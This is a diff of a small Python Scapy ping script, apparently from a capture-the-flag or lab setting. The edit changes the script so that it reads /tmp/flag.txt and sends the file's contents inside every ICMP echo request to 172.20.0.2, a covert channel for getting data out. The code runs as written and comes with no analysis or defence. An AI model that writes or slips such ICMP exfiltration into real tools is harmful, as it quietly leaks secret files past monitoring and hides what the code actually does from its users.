@@ -5,20 +5,24 @@ import time
 target_ip = "172.20.0.2"  # Replace with the desired IP address
 interval = 1  # Time in seconds between each ICMP request
 
+# Read the content from the file /tmp/flag.txt
+with open('/tmp/flag.txt', 'r') as file:
+    payload_data = file.read().strip()
+
 def ping():
     while True:
         # Create an IP packet with the target IP
         ip_packet = IP(dst=target_ip)
-        # Create an ICMP echo request
-        icmp_request = ICMP()
+        # Create an ICMP echo request with the payload
+        icmp_request = ICMP() / payload_data
         # Send the packet and wait for a response
         response = sr1(ip_packet/icmp_request, timeout=1, verbose=False)
-        
+
         if response:
             print(f"Received reply from {target_ip}")
         else:
             print(f"No reply from {target_ip}")
-        
+
         # Wait for the specified interval before sending the next packet
         time.sleep(interval)
 
